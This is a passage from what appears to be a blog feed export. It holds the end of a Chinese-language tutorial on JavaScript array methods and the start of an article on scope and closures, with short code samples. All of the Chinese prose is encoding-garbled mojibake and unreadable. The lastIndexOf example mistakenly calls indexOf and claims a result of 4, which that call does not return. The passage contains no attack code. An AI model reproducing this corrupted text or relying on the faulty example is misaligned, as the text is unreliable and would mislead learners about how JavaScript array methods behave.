 ç”±å³åˆ°å·¦ç´¯åŠ ï¼š
 var numbers = [65, 44, 12, 3];function getSum(total, num) &#123;    return total + num;&#125;numbers.reduceRight(getSum); // 124

filter
 ä¾æ“šæ¢ä»¶å›å‚³éæ¿¾å¾Œçš„é™£åˆ—ï¼š
 var ages = [32, 33, 16, 40];function checkAdult(age) &#123;    return age &gt;= 18;&#125;ages.filter(checkAdult); // [32, 33, 40]

forEach
 è¿­ä»£é™£åˆ—å…ƒç´ ï¼š
 numbers.forEach(function(value, index)&#123;	console.log(value, index);&#125;);

æœå°‹å’Œæ’åº
indexOf
 å›å‚³å€¼ä½æ–¼é™£åˆ—å…§çš„ä½ç½®ï¼Œè‹¥å€¼æœªåœ¨é™£åˆ—ä¸­å‰‡å›å‚³ -1ï¼š
 var fruits = [&quot;Banana&quot;, &quot;Orange&quot;, &quot;Apple&quot;, &quot;Mango&quot;];var a = fruits.indexOf(&quot;Orange&quot;); // 1

lastIndexOf
 èˆ‡ indexOf é¡ä¼¼ï¼Œä½†æ˜¯æ˜¯å›å‚³æœ€å¾Œä¸€æ¬¡ match åˆ°çš„ indexï¼ŒåŒæ¨£è‹¥å€¼æœªåœ¨é™£åˆ—ä¸­å‰‡å›å‚³ -1ï¼š
 var fruits = [&quot;Banana&quot;, &quot;Orange&quot;, &quot;Apple&quot;, &quot;Mango&quot;, &quot;Orange&quot;];var a = fruits.indexOf(&quot;Orange&quot;); // 4

reverse
 åè½‰é™£åˆ—å…ƒç´ ï¼š
 var fruits = [&quot;Banana&quot;, &quot;Orange&quot;, &quot;Apple&quot;, &quot;Mango&quot;];fruits.reverse(); [&#x27;Mango&#x27;, &#x27;Apple&#x27;, &#x27;Orange&#x27;, &#x27;Banana&#x27;]

sort
 å°‡é™£åˆ—å…§å®¹é€²è¡Œæ’åºï¼Œå›å‚³æ’åºå¾Œé™£åˆ—ï¼Œè‹¥ç‚ºæ–‡å­—å‰‡æ ¹æ“š ASCII Code ç·¨ç¢¼å¤§å°é€²è¡Œæ¯”è¼ƒï¼š
 var fruits = [&quot;Banana&quot;, &quot;Orange&quot;, &quot;Apple&quot;, &quot;Mango&quot;];fruits.sort();

è¼¸å‡ºé™£åˆ—ç‚ºå­—ä¸²
toString
 å°‡é™£åˆ—è½‰æˆå­—ä¸²ï¼Œä¸¦å›å‚³çµæœï¼š
 var fruits = [&quot;Banana&quot;, &quot;Orange&quot;, &quot;Apple&quot;, &quot;Mango&quot;];fruits.toString();	// Banana,Orange,Apple,Mango

valueOf 
 å›å‚³é™£åˆ—å…§å®¹ï¼š
 var fruits = [&quot;Banana&quot;, &quot;Orange&quot;, &quot;Apple&quot;, &quot;Mango&quot;];var v = fruits.valueOf();	

ç¸½çµä»¥ä¸Šå°±æ˜¯ JavaScript é™£åˆ—ï¼ˆArrayï¼‰ä»‹ç´¹å’Œæ“ä½œæ–¹æ³•ï¼Œè®€è€…å€‘åƒè¬åˆ¥èµ°çœ‹èŠ±ï¼Œå¯¦éš›å‹•æ‰‹åœ¨ console æˆ–æ˜¯ JSBin ä¸Šæ„Ÿå—ä¸€ä¸‹ï¼Œä½ å°±æœƒçŸ¥é“ JavaScript Array çš„å½ˆæ€§å¥½ç”¨ï¼æ¥ä¸‹ä¾†çš„è³‡æ–™çµæ§‹ä»‹ç´¹è£¡ä¹Ÿæœƒä½¿ç”¨åˆ°è¨±å¤š Array çš„æ“ä½œæ–¹å¼ã€‚
å»¶ä¼¸é–±è®€
JavaScript Array Reference

ï¼ˆimage via speakingcsã€dhananjay25ã€tooto1985ï¼‰
é—œæ–¼ä½œè€…ï¼š@kdchang æ–‡è—å‹é–‹ç™¼è€…ï¼Œå¤¢æƒ³æ˜¯åšå‡ºäººå€‘æƒ³ç”¨çš„ç”¢å“å’Œè¾¦ä¸€æ‰€å¿ƒç›®ä¸­ç†æƒ³çš„å­¸æ ¡ã€‚A Starter &amp; Maker. JavaScript, Python &amp; Arduino&#x2F;Android lover.:) 
]]></content>
      <tags>
        <tag>JavaScript</tag>
        <tag>Algorithm</tag>
        <tag>æ¼”ç®—æ³•</tag>
        <tag>ECMAScript2015</tag>
        <tag>ES6</tag>
        <tag>Data Structure</tag>
        <tag>Queue</tag>
        <tag>è³‡æ–™çµæ§‹</tag>
        <tag>é™£åˆ—</tag>
        <tag>Array</tag>
      </tags>
  </entry>
  <entry>
    <title>æ‰€æœ‰çš„å‡½å¼éƒ½æ˜¯é–‰åŒ…ï¼šè«‡ JS ä¸­çš„ä½œç”¨åŸŸèˆ‡ Closure</title>
    <url>/2018/12/08/javascript-closure/</url>
    <content><![CDATA[åœ¨æ­£æ–‡é–‹å§‹å‰å…ˆå¹«è‡ªå·±å°å°å·¥å•†ä¸€ä¸‹ï¼Œå‰é™£å­æŠŠè‡ªå·±ä»¥å‰å¯«éçš„æ–‡ç« éƒ½æ”¾åˆ°äº† GitHub ä¸Šé¢ï¼Œé‚£é‚Šæ¯”è¼ƒæ–¹ä¾¿æ•´ç†æ–‡ç« ä»¥åŠå›æ‡‰ï¼Œå¦‚æœæœ‰æƒ³è¨è«–çš„å¯ä»¥åœ¨é€™ç¯‡æ–‡ç« çš„ GitHub ç‰ˆæœ¬ä¸‹é¢ç•™è¨€ï¼Œæƒ³æ”¶åˆ°æ–°æ–‡ç« é€šçŸ¥çš„ä¹Ÿå¯ä»¥æŒ‰å€‹ watchï¼Œæ„Ÿè¬ã€‚
å‰è¨€è«‹å…ˆåŸè«’æˆ‘ç”¨äº†ä¸€å€‹æ¯”è¼ƒè³å‹•çš„æ¨™é¡Œï¼Œå› ç‚ºå¯¦åœ¨æ˜¯æƒ³ä¸åˆ°é‚„æœ‰ä»€éº¼æ¨™é¡Œå¥½ä¸‹ï¼Œæœ€å¾Œé¸æ“‡äº†ä¸€å€‹å¯èƒ½æ¯”è¼ƒæœ‰çˆ­è­°çš„æ¨™é¡Œï¼Œä½†èƒ½åˆ©ç”¨é€™æ¨£çš„æ¨™é¡Œæ¿€èµ·è¨è«–ä¹Ÿæ˜¯æ»¿æœ‰è¶£çš„ï¼Œä½•æ³æˆ‘èªªé€™è©±ä¹Ÿæ˜¯æœ‰æ ¹æ“šçš„ã€‚
åœ¨è§€çœ‹æ­¤ç¯‡æ–‡ç« ä¹‹å‰è«‹å…ˆçœ‹éä¸Šä¸€ç¯‡ï¼šæˆ‘çŸ¥é“ä½ æ‡‚ hoistingï¼Œå¯æ˜¯ä½ äº†è§£åˆ°å¤šæ·±ï¼Ÿï¼Œå› ç‚ºæ–‡ç« å…§å®¹æœ‰éƒ¨åˆ†ç›¸é—œï¼Œæ‰€ä»¥å¿…é ˆå…ˆæœ‰ Execution Context ä»¥åŠ Variable Object çš„è§€å¿µä»¥å¾Œï¼Œæ‰èƒ½å¤ å¸æ”¶é€™ç¯‡æ–‡ç« çš„æ±è¥¿ã€‚
å¦‚æœä½ åªå°æ–‡ç« æ¨™é¡Œçš„é‚£å¥ï¼šã€Œæ‰€æœ‰çš„å‡½å¼éƒ½æ˜¯é–‰åŒ…ã€æœ‰èˆˆè¶£ï¼Œé‚£å¯ä»¥ç›´æ¥å¾€ä¸‹æ‹‰ï¼Œå› ç‚ºè¦è¬›é–‰åŒ…å°±å¿…é ˆå…ˆå¾ä½œç”¨åŸŸé–‹å§‹è¬›èµ·ï¼Œæ‰€ä»¥é€™ç¯‡æ–‡ç« æŒ‰ç…§æ…£ä¾‹ä¸æœƒå¤ªçŸ­ï¼Œå‰é¢ä¹Ÿæœƒæœ‰ä¸€å®šç¨‹åº¦çš„é‹ªé™³ã€‚
å¥½ï¼Œè®“æˆ‘å€‘å¾ä½œç”¨åŸŸé–‹å§‹å§ã€‚
ä½œç”¨åŸŸï¼ˆScopeï¼‰ä»€éº¼æ˜¯ä½œç”¨åŸŸï¼ˆæˆ–ä¹Ÿæœ‰äººç¿»åšï¼šç¯„ç–‡ï¼‰ï¼Ÿ
æˆ‘è‡ªå·±æœ€å–œæ­¡çš„è§£é‡‹æ˜¯ï¼šã€Œä½œç”¨åŸŸå°±æ˜¯ä¸€å€‹è®Šæ•¸çš„ç”Ÿå­˜ç¯„åœï¼Œä¸€æ—¦å‡ºäº†é€™å€‹ç¯„åœï¼Œå°±ç„¡æ³•å­˜å–åˆ°é€™å€‹è®Šæ•¸ã€ã€‚
ä¾†çœ‹ä¸€å€‹ç°¡å–®çš„ä¾‹å­ï¼š
function test()&#123;  var a = 10&#125;console.log(a) // Uncaught ReferenceError: a is not defined

åœ¨ ES6 ä»¥å‰ï¼Œå”¯ä¸€ç”¢ç”Ÿä½œç”¨åŸŸçš„æ–¹æ³•å°±æ˜¯ functionï¼Œæ¯ä¸€å€‹ function éƒ½æœ‰è‡ªå·±çš„ä½œç”¨åŸŸï¼Œåœ¨ä½œç”¨åŸŸå¤–é¢ä½ å°±å­˜å–ä¸åˆ°é€™å€‹ function å…§éƒ¨æ‰€å®šç¾©çš„è®Šæ•¸ã€‚ç„¶è€Œ ES6 çš„æ™‚å€™å¼•å…¥äº† let è·Ÿ constï¼Œå¤šäº† block çš„ä½œç”¨åŸŸï¼Œä½†é‚£ä¸æ˜¯æœ¬æ–‡çš„é‡é»æ‰€åœ¨ï¼Œæ‰€ä»¥æˆ‘å°±å…ˆé€™æ¨£å¸¶éäº†ã€‚
é™¤äº†é€™ç¨® function çš„ä½œç”¨åŸŸä»¥å¤–ï¼Œé‚„æœ‰ä¸€ç¨®å«åšä½œç”¨åŸŸæ˜¯ global çš„ï¼Œå…¶å¯¦å°±æ˜¯æˆ‘å€‘å¸¸åœ¨èªªçš„ã€Œå…¨åŸŸã€ï¼Œæˆ–è€…æ˜¯ã€Œå…¨åŸŸè®Šæ•¸ã€ï¼Œä»»ä½•åœ°æ–¹éƒ½èƒ½å¤ å­˜å–åˆ°ï¼Œå¦‚ä¸‹ç¯„ä¾‹ï¼š
var I_am_global = 123function test() &#123;  console.log(I_am_global) // 123&#125;test()

å¾ä¸Šé¢çš„ç¯„ä¾‹ä¸­ä½ å¯ä»¥ç™¼ç¾ä¸€ä»¶æœ‰è¶£çš„äº‹æƒ…ï¼Œé‚£å°±æ˜¯ä½ åœ¨ function è£¡é¢å¯ä»¥å­˜å–å¤–é¢çš„è®Šæ•¸ï¼Œå¯æ˜¯ä½ å¾å¤–é¢å»é€²ä¸å» function è£¡é¢ï¼Œé€™é‚Šæˆ‘è¦å¼•ç”¨ä¹‹å‰çœ‹åˆ°çš„ä¸€å€‹å¾ˆæœ‰è¶£çš„è§£é‡‹æ–¹æ³•ï¼Œé€™ç¯‡æ–‡ç« æŠŠä½œç”¨åŸŸæ¯”å–»æˆæ˜æ˜Ÿï¼ŒæŠŠå‡½å¼æ¯”å–»æˆåœ°å€ã€‚
å…¨åŸŸè®Šæ•¸å°±æ˜¯åœ‹éš›å·¨æ˜Ÿï¼Œä¾‹å¦‚èªªæ¹¯å§†å…‹é­¯æ–¯ï¼Œç„¡è«–åˆ°å“ªè£¡å¤§å®¶éƒ½èªè­˜é€™å€‹äººï¼Œå› ç‚ºå¯¦åœ¨æ˜¯å¤ªç´…äº†ã€‚è€Œ function è£¡é¢çš„è®Šæ•¸å°±åƒæ˜¯ä½ é‚£å€‹å¾ˆæœƒå”±æ­Œçš„é„°å±…ï¼Œæ•´å€‹ç¤¾å€éƒ½çŸ¥é“å®ƒçš„å­˜åœ¨ï¼Œä½†ä¸€ä½†å‡ºäº†é€™å€‹ç¤¾å€ï¼ˆè¶…éäº†é€™å€‹ functionï¼‰ï¼Œå°±æ²’äººèªè­˜ä»–æ˜¯èª°ã€‚
æ‰€ä»¥ function ä¸€å±¤å±¤çš„çµæ§‹å°±åƒæ˜¯åœ°å€é‚£æ¨£ï¼Œæœ€å¤–å±¤æ˜¯åœ°çƒã€å†ä¾†äº”å¤§æ´²ã€äºæ´²ã€è‡ºç£ã€å°åŒ—å¸‚ã€å¤§å®‰å€ã€å¤§å®‰æ£®æ—å…¬åœ’ï¼Œåœ¨å¤§å®‰æ£®æ—å…¬åœ’é‹å‹•çš„äººçŸ¥é“é‚£é‚Šå¸¸åœ¨æ…¢è·‘çš„æœ‹å‹ï¼Œä¹ŸçŸ¥é“å°åŒ—å¸‚å…§çš„åäººï¼Œå¯æ˜¯å±…ä½åœ¨å°åŒ—å¸‚çš„äººå»ä¸ä¸€å®šçŸ¥é“å¤§å®‰å€çš„å€é•·æ˜¯èª°ï¼Œå› ç‚ºé‚£è¶…å‡ºäº†å®ƒçš„ç¯„åœã€‚
æŠŠä¸Šé¢çš„èªªæ³•è½‰æˆç¨‹å¼ç¢¼å°±æœƒè®Šæˆé€™æ¨£ï¼š
function taiwan() &#123;  var taiwan_star = &#x27;taiwan_star&#x27;  function taipei() &#123;    function daan() &#123;      var daan_star = &#x27;daan_star&#x27;      console.log(taiwan_star) // taiwan_star    &#125;    daan()    console.log(daan_star) // Uncaught ReferenceError: daan_star is not defined  &#125;  taipei()&#125;taiwan()

æ‰€ä»¥ä½ ç¾åœ¨å°ä½œç”¨åŸŸé€™å€‹è©æ‡‰è©²æ¯”è¼ƒèƒ½å¤ ç†è§£äº†ï¼Œå°±æ˜¯ä¸€å€‹è®Šæ•¸çš„ç”Ÿå­˜ç¯„åœï¼Œä¸€ä½†è¶…éé‚£å€‹ç¯„åœå°±å­˜å–ä¸åˆ°ï¼Œè€Œé€™å€‹ç¯„åœå°±æ˜¯ function æœ¬èº«åŠå…¶å…§éƒ¨ï¼Œæ‰€ä»¥ä½ åœ¨ function è£¡é¢å®£å‘Šäº†ä¸€å€‹è®Šæ•¸ï¼Œfunction å¤–æ˜¯æ²’è¾¦æ³•å­˜å–çš„ã€‚
å¤–é¢å­˜å–ä¸åˆ°è£¡é¢çš„ï¼Œä½†ã€Œå…§å±¤ã€å¯ä»¥å­˜å–åˆ°ã€Œå¤–å±¤ã€çš„æ±è¥¿ï¼š
function test() &#123;  var a = 100  function inner() &#123;    console.log(a) // 100  &#125;  inner()&#125;test()

å°æ–¼inneré€™å€‹ function ä¾†èªªï¼Œaä¸¦ä¸æ˜¯å®ƒè‡ªå·±çš„è®Šæ•¸ï¼Œè€Œé€™ç¨®ä¸åœ¨è‡ªå·±ä½œç”¨åŸŸä¸­ï¼Œä¹Ÿä¸æ˜¯è¢«ç•¶æˆåƒæ•¸å‚³é€²ä¾†çš„è®Šæ•¸ï¼Œå°±å¯ä»¥ç¨±ä½œ free variableï¼Œå¯ä»¥ç¿»åšè‡ªç”±è®Šæ•¸ï¼ˆè½èµ·ä¾†æ»¿é…·çš„ï¼‰ã€‚
å° inner ä¾†èªªï¼Œa å°±æ˜¯ä¸€å€‹è‡ªç”±è®Šæ•¸ã€‚
é‚£ a çš„å€¼æœƒæ˜¯ä»€éº¼ï¼Ÿ
å› ç‚ºåœ¨ inner é€™å€‹ä½œç”¨åŸŸè£¡é¢æ‰¾ä¸åˆ° aï¼Œå°±æœƒå»ä¸Šä¸€å±¤ test çš„ä½œç”¨åŸŸè£¡é¢å°‹æ‰¾ï¼Œå¦‚æœé‚„æ˜¯æ‰¾ä¸åˆ°ï¼Œå°±æœƒå†å¾€ä¸Šä¸€å±¤ç›´åˆ°æ‰¾åˆ°ç‚ºæ­¢ï¼Œæ‰€ä»¥ä½ å¯ä»¥ç™¼ç¾é€™æ¨£æœƒæ§‹æˆä¸€å€‹ã€Œä½œç”¨åŸŸéˆã€ï¼Œinner function scope -&gt; test function scope -&gt; global scopeï¼Œä¸æ–·åœ¨é€™æ¢éˆå¾€ä¸Šæ‰¾ï¼Œå¦‚æœæœ€å¾Œé‚„æ˜¯æ‰¾ä¸åˆ°å°±æ‹‹å‡ºéŒ¯èª¤ã€‚
è¬›åˆ°é€™é‚ŠåŸºæœ¬çš„æ¦‚å¿µæ‡‰è©²éƒ½æœ‰äº†ï¼Œå†ä¾†æˆ‘è¦å‡ºä¸€å€‹å•é¡ŒæŠŠä½ çš„èªçŸ¥é‡æ–°æ‰“äº‚ä¸¦æ··æ·†ä½ ï¼š
var a = 100function echo() &#123;  console.log(a) // 100 or 200?&#125;  function test() &#123;  var a = 200  echo()&#125;  test()

è«‹å•æœ€å¾Œ log å‡ºä¾†çš„ a æ‡‰è©²æœƒæ˜¯ 100 é‚„æ˜¯ 200ï¼Ÿ
æˆ‘çŸ¥é“ï¼æ˜¯ 100ï¼Œå› ç‚ºå…¨åŸŸè®Šæ•¸è£¡é¢çš„ a æ˜¯ 100â€¦ç­‰ç­‰ï¼Œå¯æ˜¯æˆ‘åœ¨ test è£¡é¢çš„æ™‚å€™åˆå®£å‘Šäº†ä¸€å€‹å« a çš„è®Šæ•¸ä¸¦è¨­ç‚º 200ï¼Œecho è£¡é¢çš„é€™å€‹ a å¥½åƒä¹Ÿå¯èƒ½æ˜¯ 200â€¦å¥½æ··äº‚ã€‚
ç­”æ¡ˆæ˜¯ 100ï¼Œä½ åªè¦æŒæ¡æˆ‘å€‘ä¹‹å‰èªªçš„é‚£äº›åŸå‰‡å°±è¡Œäº†ï¼Œecho è£¡é¢çš„é‚£å€‹ a å°±æ˜¯ global çš„é‚£å€‹ aï¼Œè·Ÿ test è£¡é¢çš„ a ä¸€é»é—œä¿‚éƒ½æ²’æœ‰ã€‚
ä½†ä½ æœƒè¢«æ··æ·†ä¹Ÿæ˜¯éå¸¸åˆç†çš„äº‹æƒ…ï¼Œå› ç‚ºåœ¨æŸäº›ç¨‹å¼èªè¨€è£¡é¢ï¼Œa çš„ç¢ºæœƒæ˜¯ 200 å–”ï¼a æœ€å¾Œå‡ºä¾†çš„å€¼ï¼ˆæˆ–æ›å¥è©±èªªï¼Œå¦‚ä½•æ±ºå®šè‡ªç”±è®Šæ•¸çš„å€¼ï¼‰è·Ÿç¨‹å¼èªè¨€å¦‚ä½•æ±ºå®šã€Œä½œç”¨åŸŸã€é€™ä»¶äº‹æƒ…æœ‰é—œä¿‚ã€‚
å…¶å¯¦æˆ‘å€‘ä¸€é–‹å§‹ä»‹ç´¹çš„é€™ç¨®æ–¹æ³•ï¼Œå«åšéœæ…‹ä½œç”¨åŸŸï¼ˆstatic scopeï¼‰ï¼Œç‚ºä»€éº¼å«åšéœæ…‹ï¼Ÿå°±ä»£è¡¨ä½œç”¨åŸŸè·Ÿé€™å€‹ function åœ¨å“ªè£¡è¢«ã€Œå‘¼å«ã€ä¸€é»é—œä¿‚éƒ½æ²’æœ‰ï¼Œä½ ç”¨è‚‰çœ¼çœ‹ç¨‹å¼ç¢¼çš„çµæ§‹å°±å¯ä»¥çœ‹å‡ºä¾†å®ƒçš„ä½œç”¨åŸŸæ˜¯ä»€éº¼ï¼Œè€Œä¸”æ˜¯ä¸æœƒè®Šçš„ã€‚
èˆ‰ä¾‹ä¾†èªªï¼Œä¸Šé¢é‚£å€‹ç¯„ä¾‹å°å‡ºä¾†çš„ a å°±æœƒæ˜¯ global çš„ aï¼Œå„˜ç®¡æˆ‘åœ¨ test è£¡é¢å®£å‘Šäº†å¦å¤–ä¸€å€‹ a ä¸¦ä¸”å‘¼å« echo é€™å€‹ functionï¼Œä½†é€™è·Ÿä½œç”¨åŸŸä¸€é»é—œä¿‚éƒ½æ²’æœ‰ï¼Œéœæ…‹ä½œç”¨åŸŸæ˜¯åœ¨ function è¢«ã€Œå®£å‘Šã€çš„æ™‚å€™å°±æ±ºå®šäº†ï¼Œè€Œä¸æ˜¯ function è¢«ã€ŒåŸ·è¡Œã€çš„æ™‚å€™ã€‚
ç›¸å°åœ°ï¼Œæœ‰éœæ…‹ä½œç”¨åŸŸå°±æœ‰å‹•æ…‹ä½œç”¨åŸŸï¼ˆdynamic scopeï¼‰ï¼Œå¦‚æœé€™å€‹ç¨‹å¼èªè¨€æ˜¯æ¡ç”¨å‹•æ…‹ä½œç”¨åŸŸï¼Œé‚£æœ€å¾Œ log å‡ºä¾†çš„å€¼å°±æœƒæ˜¯ 200 è€Œä¸æ˜¯ 100ï¼›æ›å¥è©±èªªï¼Œecho é€™å€‹ function è£¡é¢çš„ a çš„å€¼æ˜¯åœ¨ç¨‹å¼åŸ·è¡Œæ™‚æœŸæ‰è¢«å‹•æ…‹æ±ºå®šçš„ï¼Œä½ åªçœ‹ç¨‹å¼ç¢¼çš„çµæ§‹æ²’è¾¦æ³•æ±ºå®š a åˆ°åº•æ˜¯ä»€éº¼å€¼ã€‚
è€Œ JavaScript çš„ä½œç”¨åŸŸæ˜¯æ¡ç”¨å‰è€…ï¼Œéœæ…‹ä½œç”¨åŸŸï¼Œæ‰€ä»¥ä½ åˆ†æç¨‹å¼ç¢¼çš„çµæ§‹å°±å¯ä»¥çŸ¥é“ä½œç”¨åŸŸçš„é•·ç›¸ã€‚é€™é‚Šé †å¸¶ä¸€æçš„æ˜¯ JavaScript è£¡é¢æœ€é›£è§£çš„å•é¡Œä¹‹ä¸€ï¼šthisï¼Œå…¶å¯¦åŸç†è·Ÿå‹•æ…‹ä½œç”¨åŸŸæœ‰ç•°æ›²åŒå·¥ä¹‹å¦™ï¼Œé‚£å°±æ˜¯ this çš„å€¼ä¹Ÿæ˜¯ç¨‹å¼åŸ·è¡Œæ™‚æ‰è¢«å‹•æ…‹æ±ºå®šçš„ï¼Œé€™ä¹Ÿæ˜¯ç‚ºä»€éº¼ä¸€å¤§å †äººæœƒæä¸æ¸…æ¥šå®ƒçš„å€¼æ˜¯ä»€éº¼ï¼Œå› ç‚ºæœƒè®Šä¾†è®Šå»çš„ã€‚
éœæ…‹ä½œç”¨åŸŸå…¶å¯¦æ›´å­¸è¡“çš„åè©å«åš lexical scopeï¼Œæˆ‘æœ‰çœ‹éæœ‰äººç¿»æˆèªå½™ç¯„ç–‡ï¼Œæœ‰äººå‰‡æ˜¯ç¿»æˆè©æ³•ä½œç”¨åŸŸã€‚
è¦ç†è§£ä»€éº¼æ˜¯ lexicalï¼Œä½ å¿…é ˆå…ˆçŸ¥é“ä¸€é» compiler çš„é‹ä½œåŸç†ã€‚åœ¨ç·¨è­¯çš„æ™‚å€™æœ‰å¹¾å€‹æ­¥é©Ÿæ˜¯ç”¨ç¨‹å¼å» parse ä½ çš„ç¨‹å¼ç¢¼ä¸¦ä¸”è§£æï¼Œè€Œå…¶ä¸­ä¸€å€‹æ­¥é©Ÿå°±å«åš Lexical Analysisï¼ˆè©æ³•åˆ†ææˆ–èªå½™åˆ†æï¼‰ï¼Œå…¶å¯¦å°±æ˜¯å»æ­£ç¢ºåˆ†æå‡ºç¨‹å¼ç¢¼è£¡é¢çš„æ¯ä¸€å€‹è©ã€‚
æˆ‘èˆ‰ä¸€å€‹ä¾‹å­å¥½äº†ï¼Œä¾‹å¦‚èªª a = 13 + 2é€™ä¸€å€‹å¥å­ï¼Œç¶“éè©æ³•åˆ†æä¹‹å¾Œå¯èƒ½å°±æœƒè®Šæˆï¼šaã€=ã€13ã€+ã€2ï¼Œé€™æ¨£å­çš„åˆ†çµ„ï¼Œå°±å…ˆç†è§£åˆ°é€™é‚Šå°±å¥½ï¼Œæƒ³çŸ¥é“æ›´å¤šç·¨è­¯å™¨çš„ç´°ç¯€è«‹è‡ªè¡Œåƒè€ƒç›¸é—œæ›¸ç±æˆ–æ–‡ç« ï¼Œæˆ–ç­‰æˆ‘æœ‰ä¸€å¤©æŠŠé€™å€‹åŸºç¤è£œè¶³ä¹‹å¾Œå†ä¾†ç”¨ç™½è©±æ–‡è·Ÿå¤§å®¶åˆ†äº«ã€‚
æ‰€ä»¥æœƒå«åš lexical scope çš„åŸå› å°±æ˜¯åœ¨ç·¨è­¯çš„æ™‚å€™å…¶å¯¦å°±èƒ½æ±ºå®šä½œç”¨åŸŸæ˜¯ä»€éº¼ï¼Œæ‰æœ‰äº†é€™æ¨£å­çš„ä¸€å€‹åç¨±ã€‚
è·Ÿä½œç”¨åŸŸç›¸é—œçš„å…§å®¹å°±åˆ°é€™è£¡äº†ï¼Œå¹«å¤§å®¶è¤‡ç¿’å¹¾å€‹é—œéµå­—ï¼š

ä½œç”¨åŸŸéˆ scope chain
è‡ªç”±è®Šæ•¸ free variable
éœæ…‹ä½œç”¨åŸŸ static scopeï¼ˆlexical scopeï¼‰
å‹•æ…‹ä½œç”¨åŸŸ dynamic scope

é–‰åŒ…ï¼ˆClosureï¼‰å†ä¾†çµ‚æ–¼è¦é€²å…¥åˆ°é–‰åŒ…çš„ç›¸é—œå…§å®¹äº†ï¼Œåœ¨é€™ä¹‹å‰æˆ‘å…ˆä»‹ç´¹ä¸€ä¸‹å¤§å®¶å°è±¡ä¸­çš„é–‰åŒ…å¤§æ¦‚æ˜¯ä»€éº¼æ¨£å­ï¼Œç„¶å¾Œåˆå…·å‚™äº†ä»€éº¼æ¨£çš„ç‰¹æ€§ã€‚
è«‹çœ‹ä»¥ä¸‹ç¯„ä¾‹ç¨‹å¼ç¢¼ï¼š
function test() &#123;  var a = 10  function inner() &#123;    console.log(a) // 10  &#125;  inner()&#125;  test()

æ²’ä»€éº¼ç‰¹åˆ¥çš„ï¼Œå°±åªæ˜¯åŸ·è¡Œä¸€å€‹å…§éƒ¨çš„ function è€Œå·²ã€‚ä½†å¦‚æœæˆ‘å€‘ç¾åœ¨ä¸è¦ç›´æ¥åŸ·è¡Œ innerï¼Œè€Œæ˜¯æŠŠé€™å€‹ function å›å‚³å‘¢ï¼Ÿ
function test() &#123;  var a = 10  function inner() &#123;    console.log(a) // é‚„æ˜¯ 10  &#125;  return inner&#125;  var inner = test()inner()

ç¥å¥‡çš„äº‹æƒ…ç™¼ç”Ÿäº†ï¼Œé‚£å°±æ˜¯ç¨‹å¼ç¢¼ä¾èˆŠè¼¸å‡ºäº† 10ã€‚
ç¥å¥‡åœ¨å“ªè£¡ï¼Ÿç¥å¥‡åœ¨ä¸€å€‹ function åŸ·è¡Œå®Œæˆä»¥å¾Œæœ¬ä¾†æœƒæŠŠæ‰€æœ‰ç›¸é—œçš„è³‡æºé‡‹æ”¾æ‰ï¼Œå¯æ˜¯æˆ‘ test å·²ç¶“åŸ·è¡ŒçµæŸäº†ï¼Œç…§ç†ä¾†èªªè®Šæ•¸ a çš„è¨˜æ†¶é«”ç©ºé–“ä¹Ÿè¢«é‡‹æ”¾ï¼Œä½†æˆ‘å‘¼å« inner çš„æ™‚å€™å±…ç„¶é‚„å­˜å–å¾—åˆ° aï¼
æ›å¥è©±èªªï¼Œa é€™å€‹è®Šæ•¸è¢«ã€Œé—œåœ¨ã€inner é€™å€‹ function è£¡é¢äº†ï¼Œæ‰€ä»¥åªè¦ inner é‚„å­˜åœ¨çš„ä¸€å¤©ï¼Œa å°±æ°¸ç„¡å®‰å¯§ï¼Œåªèƒ½ä¸€ç›´è¢«é—œåœ¨è£¡é¢ã€‚
è€Œäº‹æƒ…çš„ä¸»å› å°±æ˜¯æˆ‘åœ¨ function è£¡é¢å›å‚³äº†ä¸€å€‹ functionï¼Œæ‰èƒ½é€ æˆé€™ç¨®æ˜æ˜åŸ·è¡Œå®Œç•¢å»é‚„æœ‰æ±è¥¿è¢«é—œä½çš„ç¾è±¡ï¼Œè€Œé€™ç¨®æƒ…å½¢å°±æ˜¯ä¸€èˆ¬äººæ‰€ç†ŸçŸ¥çš„é–‰åŒ…ï¼ŒClosureã€‚
é‚£é–‰åŒ…çš„å¥½è™•æœ‰ä»€éº¼ï¼Ÿå„ªé»ä¹‹ä¸€å°±æ˜¯èƒ½æŠŠè®Šæ•¸éš±è—åœ¨è£¡é¢è®“å¤–éƒ¨å­˜å–ä¸åˆ°ï¼Œèˆ‰ä¾‹ä¾†èªªæˆ‘æœ‰å€‹ç´€éŒ„é¤˜é¡çš„è®Šæ•¸è·Ÿä¸€å€‹æ‰£æ¬¾çš„ functionï¼Œä½†æˆ‘æœ‰è¨­ç½®äº†ä¸€å€‹ä¸Šé™ï¼Œé‚£å°±æ˜¯æœ€é«˜åªèƒ½æ‰£ 10 å¡Šï¼š
var my_balance = 999function deduct(n) &#123;  my_balance -= (n &gt; 10 ? 10 : n) // è¶…é 10 å¡Šåªæ‰£ 10 å¡Š&#125;  deduct(13) // åªè¢«æ‰£ 10 å¡Šmy_balance -= 999 // é‚„æ˜¯è¢«æ‰£äº† 999 å¡Š

å„˜ç®¡æˆ‘å€‘å¯«äº† deduct é€™å€‹ function ä¾†æ“ä½œï¼Œä½†è®Šæ•¸é‚„æ˜¯æš´éœ²åœ¨å¤–éƒ¨ï¼Œä»»ä½•äººéƒ½å¯ä»¥ç›´æ¥ä¾†æ”¹é€™å€‹è®Šæ•¸ã€‚é€™æ™‚å¦‚æœæˆ‘å€‘åˆ©ç”¨é–‰åŒ…ä¾†æ”¹å¯«ï¼Œä¸–ç•Œå°±ä¸ä¸€æ¨£äº†ï¼š
function getWallet() &#123;  var my_balance = 999  return &#123;    deduct: function(n) &#123;      my_balance -= (n &gt; 10 ? 10 : n) // è¶…é 10 å¡Šåªæ‰£ 10 å¡Š    &#125;  &#125;&#125;  var wallet = getWallet()wallet.deduct(13) // åªè¢«æ‰£ 10 å¡Šmy_balance -= 999 // Uncaught ReferenceError: my_balance is not defined

å› ç‚ºæˆ‘æŠŠé¤˜é¡é€™å€‹è®Šæ•¸çµ¦è—åœ¨ function è£¡é¢ï¼Œæ‰€ä»¥å¤–éƒ¨æ˜¯å­˜å–ä¸åˆ°çš„ï¼Œä½ æƒ³è¦ä¿®æ”¹åªèƒ½å¤ åˆ©ç”¨æˆ‘æš´éœ²å‡ºå»çš„ deduct é€™å€‹å‡½å¼ï¼Œé€™æ¨£å­å°±é”åˆ°äº†éš±è—è³‡è¨Šçš„ç›®çš„ï¼Œç¢ºä¿é€™å€‹è®Šæ•¸ä¸æœƒéš¨æ„åœ°è¢«æ”¹åˆ°ã€‚
